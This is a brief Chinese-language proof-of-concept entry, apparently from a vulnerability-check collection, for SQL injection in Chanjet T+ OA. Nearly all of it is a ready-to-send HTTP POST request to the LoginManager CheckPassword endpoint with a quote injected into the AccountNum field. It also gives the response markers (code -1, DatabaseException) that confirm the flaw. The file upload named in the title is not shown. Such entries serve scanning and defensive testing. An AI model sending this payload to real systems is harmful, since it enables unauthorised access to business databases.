﻿# 畅捷通 OA sql注入文件上传

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword HTTP/1.1
Content-Type: multipart/form-data; boundary=ce2c603de19573a853c8facc8cf14425

{
"AccountNum":"1'",
"UserName":"admin",
"Password":"e10adc3949ba59abbe56e057f20f883e",
"rdpYear":"2022",
"rdpMonth":"2",
"rdpDate":"21",
"webServiceProcessID":"admin",
"ali_csessionid":"",
"ali_sig":"",
"ali_token":"",
"ali_scene":"",
"role":"",
"aqdKey":"",
"formWhere":"browser",
"cardNo":""
}
```

> 响应代码特征：-1

> 响应内容特征：DatabaseException

> 上传文件定位：

> 验证文件来源：畅捷通 OA sql注入文件上传.poc
